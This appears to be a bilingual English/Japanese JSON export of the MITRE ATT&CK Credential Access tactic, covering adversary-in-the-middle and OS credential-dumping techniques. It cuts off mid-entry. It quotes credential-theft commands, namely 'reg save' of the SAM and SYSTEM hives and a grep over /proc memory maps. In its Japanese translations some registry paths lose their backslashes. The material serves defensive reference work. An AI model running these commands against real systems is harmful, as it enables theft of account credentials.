[
    {
        "id": "TA0006",
        "name_eng": "Credential Access",
        "name_jp": "クレデンシャル・アクセス",
        "description_eng": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
        "description_jp": "敵はアカウント名とパスワードを盗もうとしている。\n\nクレデンシャル・アクセスは、アカウント名やパスワードのようなクレデンシャルを盗む技術で構成される。クレデンシャルを取得するために使用される技法には、キーロギングまたはクレデンシャル・ダンピングが含まれる。正当なクレデンシャルを使用することで、敵対者はシステムにアクセスできるようになり、検出が難しくなり、目的達成のためにさらにアカウントを作成する機会を得ることができます。",
        "techniques": [
            {
                "id": "T1557",
                "name_eng": "Adversary-in-the-Middle",
                "name_jp": "中間敵対者",
                "description_eng": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "description_jp": "敵対者は、[ネットワーク・スニッフィング](https://attack.mitre.org/techniques/T1040)、[送信データ操作](https://attack.mitre.org/techniques/T1565/002)、またはリプレイ攻撃([クレデンシャル・アクセスのための搾取](https://attack.mitre.org/techniques/T1212))などの後続動作をサポートするために、敵対者の中間(AiTM)技術を使用して 2 つ以上のネットワーク接続されたデバイスの間に自分自身を位置付けようとするかもしれない。ネットワーク・トラフィックのフローを決定できる一般的なネットワーキング・プロトコルの機能(ARP、DNS、LLMNR など)を悪用することで、敵対者はデバイスに敵対者が制御するシステムを介して通信するよう強制し、情報収集や追加のアクションを実行することができる(引用：Rapid7 MiTM Basics)。\n\n例えば、敵対者は被害者の DNS 設定を操作して、ユーザが合法的なサイトにアクセスするのを阻止/リダイレクトしたり、追加のマルウェアをプッシュしたりするなどの他の悪意ある活動を可能にするかもしれません(引用：ttint_rat)(引用：dns_changer_trojans)(引用：ad_blocker_with_miner) また、敵対者は DNS を操作し、その立場を利用して、アクセストークンを含むユーザの認証情報を傍受する可能性もあります([Steal Application Access Token](https://attack.mitre.org/techniques/T1528))やセッションクッキー([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) を含む。(引用：volexity_0day_sophos_FW)(引用：トークン戦術) [ダウングレード攻撃](https://attack.mitre.org/techniques/T1562/010)通信プロトコル(SSL/TLS)や暗号化アルゴリズムの、より安全性の低い、非推奨の、またはより弱いバージョンを交渉することなどによって、AiTMの立場を確立するために使用することもできる(引用：mitm_tls_downgrade_att)(引用：taxonomy_downgrade_att_tls)(引用：tlseminar_downgrade_att)\n\n攻撃者はまた、AiTM の立場を利用して、[Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)のように、トラフィックの監視や変更を試みることもできる。攻撃者は AiTM と同じようなポジションをセットアップして、トラフィックが適切な宛先に流れ ないようにすることができる。これは潜在的には[Impair Defenses](https://attack.mitre.org/techniques/T1562)、[Network Denial of Service](https://attack.mitre.org/techniques/T1498)をサポートするためである。",
                "subtechniques": [
                    {
                        "id": "T1557.003",
                        "name_eng": "DHCP Spoofing",
                        "name_jp": "DHCPスプーフィング",
                        "description_eng": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool.",
                        "description_jp": "敵対者は、DHCP（Dynamic Host Configuration Protocol）トラフィックを偽装し、被害者ネットワーク上で悪意のあるDHCPサーバとして振る舞うことで、ネットワークトラフィックを敵対者が所有するシステムにリダイレクトする可能性があります。敵対者は、中間者（AiTM）の立場を獲得することで、特に安全でない暗号化されていないプロトコルで送信された、渡された認証情報を含むネットワーク通信を収集することができます。これにより、[ネットワーク・スニッフィング](https://attack.mitre.org/techniques/T1040) や [送信データ操作](https://attack.mitre.org/techniques/T1565/002) のような後続の動作も可能になるかもしれません。\n\nDHCPはクライアント・サーバ・モデルに基づいており、DHCPサーバからク ライアントにネットワーク・コンフィグレーション設定を提供するプロトコルと、 クライアントにネットワーク・アドレスを割り当てるメカニズムという2つの機能を持ってい ます：\n\n1.クライアントは「DISCOVER」メッセージをブロードキャストする。\n\n2.サーバーは利用可能なネットワークアドレスを含む `OFFER` メッセージで応答する。\n\n3.クライアントは`REQUEST`メッセージをブロードキャストする。\n\n4.サーバは`ACK`メッセージで確認し、クライアントはネットワーク設定パラメータを受信する。\n\n攻撃者は被害者ネットワーク上で不正なDHCPサーバになりすまし、そこから正当なホストが悪意のあるネットワーク設定を受け取るかもしれません。例えば、マルウェアは DHCP サーバとして動作し、敵が所有する DNS サーバを被害コンピュータに提供することができる。(引用：new_rogue_DHCP_serv_malware)(引用：w32.tidserv.g) 悪意のあるネットワーク・コンフィギュレーションを通して、敵は AiTM の位置を獲得し、クライアントのトラフィックを敵が制御するシステムにルーティングし、クライアント・ネットワークから情報を収集することができる。\n\nDHCPv6クライアントは、<code>All_DHCP_Relay_Agents_and_Servers</code>マルチキャストアドレスに<code>INFORMATION-REQUEST(code 11)</code>メッセージを送信することで、IPアドレスを割り当てられることなくネットワーク設定情報を受け取ることができます(引用：rfc3315)。\n\nまた、DHCPスプーフィングを悪用して、ブロードキャストDISCOVERメッセー ジを多数生成し、ネットワークのDHCP割り当てプールを使い果たす攻撃(Service Exhaustion Flood)(https://attack.mitre.org/techniques/T1499/002)を行うこともあります。"
                    },
                    {
                        "id": "T1557.002",
                        "name_eng": "ARP Cache Poisoning",
                        "name_jp": "ARPキャッシュポイズニング",
                        "description_eng": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)",
                        "description_jp": "攻撃者はアドレス解決プロトコル(ARP)キャッシュを汚染し、2つ以上のネットワークデバイスの通信の間に位置する。この活動は、[ネットワーク・スニッフィング](https://attack.mitre.org/techniques/T1040)や[送信データ操作](https://attack.mitre.org/techniques/T1565/002)などの後続の行動を可能にするために使用されるかもしれない。\n\nARPプロトコルは、IPv4アドレスをメディアアクセス制御（MAC）アドレスなどのリンク層アドレスに解決するために使用される（引用：RFC826 ARP）。ネットワークデバイスが特定のネットワークデバイスのリンクレイヤーアドレスを持たない場合、IPアドレスをMACアドレスに変換するために、ローカルネットワークにブロードキャストARPリクエストを送信することがあります。関連するIPアドレスを持つデバイスは、直接そのMACアドレスを返信します。ARPリクエストを行ったネットワークデバイスは、その情報をARPキャッシュに保存するだけでなく、使用します。\n\n敵対者はARPリクエストを受動的に待ち、リクエストしたデバイスのARPキャッシュを汚染するかもしれない。敵対者は自分のMACアドレスで返信し、被害者に意図したネットワークデバイスと通信していると思わせて欺くかもしれない。敵対者がARPキャッシュをポイズニングするには、その返信が正当なIPアドレスの所有者が行うものより速くなければならない。敵はまた、特定のIPアドレスの所有者をローカルネットワークセグメント内のすべてのデバイスに悪意を持って公表する、無償のARPリプライを送信する可能性があります。\n\nARPプロトコルはステートレスであり、認証を必要としない。そのため、デバイスは、ARPキャッシュ内のIPアドレスのMACアドレスを誤って追加または更新する可能性がある(引用：Sans ARP Spoofing Aug 2003)(引用：Cylance Cleaver)\n\n攻撃者は、ネットワークトラフィックを傍受する手段としてARPキャッシュポイズニングを使用する可能性があります。この行為は、特に安全でない暗号化されていないプロトコルで送信された認証情報などのデータを収集したり、中継したりするために使用される可能性がある(引用：Sans ARP Spoofing Aug 2003)"
                    },
                    {
                        "id": "T1557.001",
                        "name_eng": "LLMNR/NBT-NS Poisoning and SMB Relay",
                        "name_jp": "LLMNR/NBT-NSポイズニングとSMBリレー",
                        "description_eng": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nIn some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. \n\nSeveral tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder)",
                        "description_jp": "LLMNR/NBT-NSネットワークトラフィックに応答することで、敵対者は名前解決のための権威ソースを偽装し、敵対者が制御するシステムとの通信を強制することができる。この活動は、認証材料を収集または中継するために使用される可能性がある。\n\nLink-Local Multicast Name Resolution (LLMNR) および NetBIOS Name Service (NBT-NS) は、ホスト識別の代替方法として機能する Microsoft Windows コンポーネントです。LLMNRはドメインネームシステム（DNS）形式に基づいており、同じローカルリンク上のホストが他のホストの名前解決を実行できるようにする。NBT-NSは、NetBIOS名によってローカルネットワーク上のシステムを識別する。(引用：Wikipedia LLMNR)(引用：TechNet NetBIOS)\n\n攻撃者は、LLMNR (UDP 5355)/NBT-NS (UDP 137)トラフィックに対して、要求されたホストの身元を知っているかのように応答することで、被害者ネットワーク上の名前解決の権威ソースを偽装することができます。リクエストされたホストが識別/認証を必要とするリソースに属している場合、ユーザ名と NTLMv2 ハッシュが敵対者の制御下にあるシステムに送信される。そして敵対者は、ポートのトラフィックを監視するツールや[Network Sniffing](https://attack.mitre.org/techniques/T1040)を用いて有線で送信されたハッシュ情報を収集し、[Brute Force](https://attack.mitre.org/techniques/T1110)を用いてオフラインでハッシュをクラックし、平文のパスワードを入手することができる。\n\n敵対者がシステム間の認証経路にあるシステムにアクセスできる場合や、認証情報を使用する自動スキャンが敵対者の制御下にあるシステムに対して認証を行おうとする場合、NTLMv1/v2 ハッシュを傍受し、ターゲットシステムに対してアクセスしコードを実行するために中継することができる。リレーのステップはポイズニングと連動して行われることもあるが、それとは無関係に行われることもある(引用: byt3bl33d3r NTLM Relaying)(引用: Secure Ideas SMB Relay) さらに、敵対者は NTLMv1/v2 ハッシュを LDAP、SMB、MSSQL、HTTP などの様々なプロトコルにカプセル化し、有効な NTLM レスポンスを用いて複数のサービスを拡張し、利用することができる。\n\nNBNSpoof や Metasploit、[Responder](https://attack.mitre.org/software/S0174) など、ローカルネットワーク内のネームサービスを汚染するためにいくつかのツールが使用されている。"
                    },
                    {
                        "id": "T1557.004",
                        "name_eng": "Evil Twin",
                        "name_jp": "邪悪な双子",
                        "description_eng": "Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or [Input Capture](https://attack.mitre.org/techniques/T1056).(Citation: Australia ‘Evil Twin’)\n\nBy using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks.(Citation: Kaspersky evil twin)(Citation: medium evil twin)  Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks.(Citation: specter ops evil twin)  A Wi-Fi Pineapple – a network security auditing and penetration testing tool – may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic. \n\nSimilarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network.(Citation: specter ops evil twin)  Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network.\n\nUpon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim’s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points.",
                        "description_jp": "攻撃者は、[ネットワーク・スニッフィング](https://attack.mitre.org/techniques/T1040)、[送信データ操作](https://attack.mitre.org/techniques/T1565/002)、[入力キャプチャ](https://attack.mitre.org/techniques/T1056)などの後続行為をサポートする方法として、一見本物のWi-Fiアクセスポイントをホストしてユーザーを欺き、悪意のあるネットワークに接続させることがあります。(引用：オーストラリア「イービル・ツイン」)\n\n正規のWi-Fiネットワークのサービスセット識別子(SSID)を使用することで、不正なWi-Fiアクセスポイントはデバイスやユーザーを騙し、悪意のあるWi-Fiネットワークに接続させる可能性があります(引用：Kaspersky evil twin)(引用：medium evil twin) 敵対者は、被害者のデバイスを悪意のあるネットワークに接続するよう強要または誘惑するために、より強い信号強度を提供したり、Wi-Fiアクセスポイントへのアクセスをブロックしたりする可能性があります。(引用：specter ops evil twin） ネットワーク・セキュリティ監査および侵入テスト・ツールであるWi-Fi Pineappleは、使いやすさと範囲の広さを目的として、Evil Twin攻撃に導入されることがあります。HTTPS トラフィックを傍受するために、カスタム証明書が使用されることもある。\n\n同様に、敵対者は既知の、あるいは以前に接続されたネットワーク（Preferred Network Lists：PNL）に対するプローブ要求を送信するクライアント・デバイスをリッスンすることもあります。悪意のあるアクセス・ポイントがプローブ・リクエストを受信すると、敵対者は同じ SSID で応答し、信頼できる既知のネットワークを模倣することができます（引用：specter ops evil twin）。被害者デバイスは、応答したアクセス・ポイントが自分の PNL のものであると信じ込まされ、不正なネットワークへの接続を開始します。\n\n悪意のあるWi-Fiアクセス・ポイントにログインすると、ユーザーは偽のログイン・ページやキャプティブ・ポータル・ウェブページに誘導され、被害者の認証情報を取得します。ユーザーが不正なWi-Fiネットワークにログインすると、敵対者はネットワーク・アクティビティを監視したり、データを操作したり、追加の認証情報を盗んだりすることができます。空港、喫茶店、図書館など、公衆Wi-Fiアクセスが集中している場所は、敵対者が不正なWi-Fiアクセス・ポイントを設置するターゲットになる可能性があります。"
                    }
                ]
            },
            {
                "id": "T1003",
                "name_eng": "OS Credential Dumping",
                "name_jp": "OS クレデンシャルのダンプ",
                "description_eng": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.\n\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",
                "description_jp": "攻撃者はクレデンシャルをダンプして、通常はハッシュまたはクリアテキストのパスワードの形で、アカウントのログインとクレデンシャルの材料を得ようとするかもしれない。クレデンシャルは、OS のキャッシュ、メモリ、または構造体から取得することができる。(引用：Bringing MimiKatz to Unix) その後、クレデンシャルは [Lateral Movement](https://attack.mitre.org/tactics/TA0008) を実行したり、制限された情報にアクセスしたりするために使用することができる。\n\n関連するサブテクニックで言及されたいくつかのツールは、敵対者とプロのセキュリティテスターの両方によって使用されるかもしれません。その他のカスタムツールも存在すると思われます。",
                "subtechniques": [
                    {
                        "id": "T1003.002",
                        "name_eng": "Security Account Manager",
                        "name_jp": "セキュリティ・アカウント・マネージャー",
                        "description_eng": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.",
                        "description_jp": "攻撃者は、インメモリ技術または SAM データベースが格納されている Windows レジストリを通して、Security Account Manager (SAM) データベースからクレデンシャル情報を抽出しようとするかもしれない。SAM はホストのローカルアカウントを含むデータベースファイルであり、典型的には <code>net user</code> コマンドで見つかるものである。SAMデータベースを列挙するには、SYSTEMレベルのアクセスが必要である。\n\nインメモリ技術を使って SAM ファイルを取り出すには、 多くのツールを使うことができる：\n\n* pwdumpx.exe\npwdumpx.exe * [gsecdump](https://attack.mitre.org/software/S0008)\n* Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nあるいは、レジストリからReg：\n\n<code>reg save HKLMsam sam</code> とする。\n<code>reg save HKLMsystem system</code> を実行する。\n\nその後、Creddump7を使用してローカルでSAMデータベースを処理し、ハッシュを取得することができる(引用: GitHub Creddump7)\n\n注釈\n\n* RID 500 のアカウントは、ローカルのビルトイン管理者である。\n* RID 501はゲストアカウントである。\n* ユーザー・アカウントはRID 1,000以上で始まります。"
                    },
                    {
                        "id": "T1003.004",
                        "name_eng": "LSA Secrets",
                        "name_jp": "LSAの秘密",
                        "description_eng": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",
                        "description_jp": "ホストへのSYSTEMアクセス権を持つ攻撃者は、サービスアカウントの資格情報など、さまざまな資格情報を含む可能性のあるLSA（Local Security Authority）秘密へのアクセスを試みる可能性があります。(引用：Passcape LSA Secrets)(引用：Microsoft AD Admin Tier Model)(Citation：Tilbury Windows Credentials) LSA秘密は、レジストリの<code>HKEY_LOCAL_MACHINE</code>に格納されます。LSAシークレットはメモリからダンプすることもできる。\n\n[Reg](https://attack.mitre.org/software/S0075)を使ってレジストリから取り出すことができる。[Mimikatz](https://attack.mitre.org/software/S0002)はメモリから秘密を取り出すのに使える。(引用: ired Dumping LSA Secrets)"
                    },
                    {
                        "id": "T1003.006",
                        "name_eng": "DCSync",
                        "name_jp": "DCSync",
                        "description_eng": "Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.\n\nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)\n\nDCSync functionality has been included in the \"lsadump\" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)",
                        "description_jp": "攻撃者は、Windowsドメインコントローラのアプリケーションプログラミングインターフェース（API）（引用：Microsoft DRSR Dec 2017）（引用：Microsoft GetNCCChanges）（引用：Samba DRSUAPI）（引用：Wine API samlib.dll）を悪用し、DCSyncと呼ばれる技法を使用してリモートドメインコントローラからのレプリケーションプロセスをシミュレートすることで、認証情報やその他の機密情報へのアクセスを試みる可能性があります。\n\nドメインコントローラ上のAdministrators、Domain Admins、Enterprise Adminの各グループまたはコンピュータアカウントのメンバーは、DCSyncを実行してActive Directoryからパスワードデータ(引用：ADSecurity Mimikatz DCSync)を引き出すことができる。このハッシュは次に、[Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync)で使用するための[Golden Ticket](https://attack.mitre.org/techniques/T1558/001)(Citation: InsiderThreat ChangeNTLM July 2017)を作成したり、[Account Manipulation](https://attack.mitre.org/techniques/T1098)(Citation: InsiderThreat ChangeNTLM July 2017)に記載されているように、アカウントのパスワードを変更したりするために使用することができる。\n\nDCSync機能は、[Mimikatz](https://attack.mitre.org/software/S0002)の \"lsadump \"モジュールに含まれている(引用: GitHub Mimikatz lsadump Module) Lsadumpには、レガシーレプリケーションプロトコル上でDCSyncを実行するNetSyncも含まれている(引用: Microsoft NRPC Dec 2017)"
                    },
                    {
                        "id": "T1003.007",
                        "name_eng": "Proc Filesystem",
                        "name_jp": "Proc ファイルシステム",
                        "description_eng": "Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)\n\nWhen executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E \"^[0-9a-f-]* r\" /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes.(Citation: atomic-red proc file system) When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)\n\nIf running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.",
                        "description_jp": "攻撃者は proc ファイルシステムまたは `/proc` から認証情報を収集する可能性がある。proc ファイルシステムは、仮想メモリを管理する Linux ベースのシステムで、カーネルデータ構造へのインターフェースとして使用される擬似ファイルシステムである。各プロセスの `/proc/<PID>/maps` ファイルは、プロセスの仮想アドレス空間内でメモリがどのようにマッピングされているかを示す。また、デバッグ目的で公開される `/proc/<PID>/mem` ファイルは、プロセスの仮想アドレス空間へのアクセスを提供する。(引用: Picus Labs Proc cump 2022)(引用: baeldung Linux proc map 2022)\n\nroot権限で実行する場合、敵対者はこれらのメモリロケーションを検索して、資格情報を示すパターンを含むシステム上のすべてのプロセスを探すことができる。敵は、<code>grep -E \"^[0-9a-f-]* r \"のような正規表現パターンを使用することができます。/proc/\"$pid\"/maps | cut -d' ' -f 1</code>のような正規表現パターンを使って、メモリ構造やキャッシュされたハッシュ内の固定文字列を探すことができる。（引用：atomic-red proc ファイルシステム）特権アクセスなしで実行されている場合でも、プロセスは自分自身の仮想メモリロケーションを見ることができる。サービスやプログラムによっては、プロセスのメモリ内に認証情報を平文で保存することがある(引用: MimiPenguin GitHub 2017年5月)(引用: Polop Linux PrivEsc Gitbook)\n\nウェブブラウザとして、またはウェブブラウザの権限で実行されている場合、プロセスは `/maps` と `/mem` ロケーションを検索して、ハッシュまたはクリアテキストの認証情報が置かれている可能性のある一般的なウェブサイトの認証情報パターン（同じ構造内の隣接するメモリを見つけるのにも使用できる）を探すことができる。"
                    },
                    {
                        "id": "T1003.003",
                        "name_eng": "NTDS",
                        "name_jp": "NTDS",
                        "description_eng": "Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory)\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy",
